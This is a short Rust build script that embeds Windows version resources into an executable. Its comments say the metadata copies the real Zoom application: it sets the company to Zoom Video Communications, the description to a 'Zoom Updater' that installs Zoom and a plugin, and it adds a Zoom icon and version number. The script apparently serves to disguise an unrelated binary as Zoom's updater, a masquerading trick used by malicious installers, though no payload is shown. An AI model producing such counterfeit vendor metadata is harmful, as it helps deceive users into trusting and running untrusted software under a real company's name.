fn main() {
    // Use winres to embed Windows version resources.
    // The following metadata mirrors the real Zoom application metadata.
        #[cfg(windows)]
        {
            let mut res = winres::WindowsResource::new();
            // Icon – replace with a proper Zoom icon if available.
            res.set_icon("icon.ico");
        
            // Human‑readable description of what this executable does.
            res.set("FileDescription", "Zoom Updater – installs Zoom and its plugin");
            // Product name shown in file properties.
            res.set("ProductName", "Zoom");
            // Company that ships the product.
            res.set("CompanyName", "Zoom Video Communications, Inc.");
            // Legal copyright line – use a current year.
            res.set("LegalCopyright", "© 2026 Zoom Video Communications");
            // Version information – match a recent Zoom release (example: 5.13.0.1234).
            // Both FileVersion and ProductVersion should be four‑part numeric strings.
            res.set("FileVersion", "5.13.0.1234");
            res.set("ProductVersion", "5.13.0.1234");
        
            // Compile the resources into the final binary.
            res.compile().expect("Failed to compile Windows resources");
        }
}
